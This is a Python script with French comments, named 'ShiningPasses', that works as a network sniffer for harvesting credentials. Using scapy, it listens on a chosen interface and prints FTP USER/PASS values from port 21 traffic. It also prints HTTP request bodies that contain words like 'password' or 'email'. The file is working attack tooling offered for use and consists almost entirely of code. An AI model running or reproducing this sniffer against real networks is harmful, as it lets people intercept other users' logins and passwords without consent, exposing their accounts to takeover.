import os
import optparse #Pour les options de script
from scapy.all import *
from scapy_http import http
from termcolor import colored

prompt = "|# ShiningPasses \#|\#> "
mots = ["password","username","login","pass","User","Password","email"] #Mots interessants

#Sniffer
def ftpSniff(paquet):
	#Récupération de l'@IP (Couche IP et destination)
	destination = paquet.getlayer(IP).dst
	raw = paquet.sprintf("%Raw.load%") #Contenu du paquet

	#re = Regex (<Que chercher>,<Ou chercher>)
	user = re.findall('(?i)USER (.*)', raw)
	password = re.findall('(?i)PASS (.*)', raw)

	#Si on a trouvé un user
	if user:
		username = str(user[0]) #user est une liste de mots qui respectent le pattern du regex
		print(colored(prompt+"CONNEXION FTP DETECTEE VERS "+str(destination)+" !!","green", attrs=["bold"]))
		print(colored(prompt+"USER: "+str(username),"green")) #[0] car il renvoie tous les éléments respectants le pattern
	elif password:
		passwd = password[0]
		print(colored(prompt+"MOT DE PASSE: "+passwd+"\n","green"))

def HTTPSniff(paquet):
	#Si c'est une requête HTTP
	if paquet.haslayer(http.HTTPRequest):
		url = paquet[http.HTTPRequest].Host + paquet[http.HTTPRequest].Path
		print(url)

		#Si le paquet a du contenu (Sûrement où y'a MDP)
		if paquet.haslayer(Raw):
			load = paquet[Raw].load
			#Vérification du contenu
			for motInteressant in mots:
				#Si contenu intéressant !
				if motInteressant in str(load):
					#Nettoyage
					os.system("clear")
					print(colored(banner,"yellow"))
					print(colored(title, "yellow"))
					print(colored(prompt+"Mode de sniff choisi: HTTP","yellow"))
					print(colored(prompt+"[CTRL+C] Pour arrêter l'écoute.\n", "magenta"))


					print(colored(prompt+"\nCONNEXION HTTP OBTENUE ! (Trouvez en bas \"USER\" ou \"email\" voire \"PASS\" etc...)", "green", attrs=['bold']))
					print(load)
					print("\n\n")
					break

def main():
	os.system("clear")
	print(colored(banner,"yellow"))
	print(colored(title, "yellow"))

	#Comment l'utiliser si mauvais usage ?
	parser = optparse.OptionParser('Utilisation: -i <Interface>\n')

	#Ajout de l'option
	parser.add_option("-i", dest="interface", type="string", help="Sur quelle interface écouter?")
	(options, args) = parser.parse_args()

	if options.interface == None: #Si après -i il n'y a rien
		print(parser.usage)
		exit(1)
	else:
		conf.iface = options.interface

	print(colored("[1] Sniffer des mots de passes FTP","yellow"))
	print(colored("[2] Sniffer des mots de passes HTTP\n","yellow"))
	choix = int(input("Votre choix? "))

	if choix != 1 and choix != 2:
		print(colored("[ERREUR] Choix incorrect ! Fin du programme...\n", "red"))
		exit(1)

	os.system("clear")
	print(colored(banner,"yellow"))
	print(colored(title,"yellow"))

	print(colored(prompt+"Ecoute sur l'interface "+options.interface+"...", "green"))
	if choix == 1:
		print(colored(prompt+"Mode de sniff choisi: FTP","yellow"))
	else:
		print(colored(prompt+"Mode de sniff choisi: HTTP","yellow"))

	print(colored(prompt+"[CTRL+C] Pour arrêter l'écoute.\n", "magenta"))

	try:
		#Appel de la fonction après PRN (ici ftpSniff)
		if choix == 1:
			sniff(filter="tcp port 21", prn=ftpSniff)
		else:
			sniff(iface=options.interface, store=False, prn=HTTPSniff)
	except KeyboardInterrupt:
		exit(1)

banner=(" ▄▄▄▄▄▄▄▄▄▄▄ ▄         ▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄        ▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄        ▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄\n"+
"▐░░░░░░░░░░░▐░▌       ▐░▐░░░░░░░░░░░▐░░▌      ▐░▐░░░░░░░░░░░▐░░▌      ▐░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▌\n"+
"▐░█▀▀▀▀▀▀▀▀▀▐░▌       ▐░▌▀▀▀▀█░█▀▀▀▀▐░▌░▌     ▐░▌▀▀▀▀█░█▀▀▀▀▐░▌░▌     ▐░▐░█▀▀▀▀▀▀▀▀▀▐░█▀▀▀▀▀▀▀█░▐░█▀▀▀▀▀▀▀█░▐░█▀▀▀▀▀▀▀▀▀▐░█▀▀▀▀▀▀▀▀▀▐░█▀▀▀▀▀▀▀▀▀▐░█▀▀▀▀▀▀▀▀▀\n"+
"▐░▌         ▐░▌       ▐░▌    ▐░▌    ▐░▌▐░▌    ▐░▌    ▐░▌    ▐░▌▐░▌    ▐░▐░▌         ▐░▌       ▐░▐░▌       ▐░▐░▌         ▐░▌         ▐░▌         ▐░▌\n"+
"▐░█▄▄▄▄▄▄▄▄▄▐░█▄▄▄▄▄▄▄█░▌    ▐░▌    ▐░▌ ▐░▌   ▐░▌    ▐░▌    ▐░▌ ▐░▌   ▐░▐░▌ ▄▄▄▄▄▄▄▄▐░█▄▄▄▄▄▄▄█░▐░█▄▄▄▄▄▄▄█░▐░█▄▄▄▄▄▄▄▄▄▐░█▄▄▄▄▄▄▄▄▄▐░█▄▄▄▄▄▄▄▄▄▐░█▄▄▄▄▄▄▄▄▄\n"+
"▐░░░░░░░░░░░▐░░░░░░░░░░░▌    ▐░▌    ▐░▌  ▐░▌  ▐░▌    ▐░▌    ▐░▌  ▐░▌  ▐░▐░▌▐░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▌\n"+
" ▀▀▀▀▀▀▀▀▀█░▐░█▀▀▀▀▀▀▀█░▌    ▐░▌    ▐░▌   ▐░▌ ▐░▌    ▐░▌    ▐░▌   ▐░▌ ▐░▐░▌ ▀▀▀▀▀▀█░▐░█▀▀▀▀▀▀▀▀▀▐░█▀▀▀▀▀▀▀█░▌▀▀▀▀▀▀▀▀▀█░▌▀▀▀▀▀▀▀▀▀█░▐░█▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀█░▌\n"+
"          ▐░▐░▌       ▐░▌    ▐░▌    ▐░▌    ▐░▌▐░▌    ▐░▌    ▐░▌    ▐░▌▐░▐░▌       ▐░▐░▌         ▐░▌       ▐░▌         ▐░▌         ▐░▐░▌                   ▐░▌\n"+
" ▄▄▄▄▄▄▄▄▄█░▐░▌       ▐░▌▄▄▄▄█░█▄▄▄▄▐░▌     ▐░▐░▌▄▄▄▄█░█▄▄▄▄▐░▌     ▐░▐░▐░█▄▄▄▄▄▄▄█░▐░▌         ▐░▌       ▐░▌▄▄▄▄▄▄▄▄▄█░▌▄▄▄▄▄▄▄▄▄█░▐░█▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄█░▌\n"+
"▐░░░░░░░░░░░▐░▌       ▐░▐░░░░░░░░░░░▐░▌      ▐░░▐░░░░░░░░░░░▐░▌      ▐░░▐░░░░░░░░░░░▐░▌         ▐░▌       ▐░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▌\n"+
" ▀▀▀▀▀▀▀▀▀▀▀ ▀         ▀ ▀▀▀▀▀▀▀▀▀▀▀ ▀        ▀▀ ▀▀▀▀▀▀▀▀▀▀▀ ▀        ▀▀ ▀▀▀▀▀▀▀▀▀▀▀ ▀           ▀         ▀ ▀▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀")
title="\t\t\t\t\t\t\tNetwork Sniffer (HTTP/FTP) by b64-Sm9yZGFuIExBSVJFUw\n"
main()

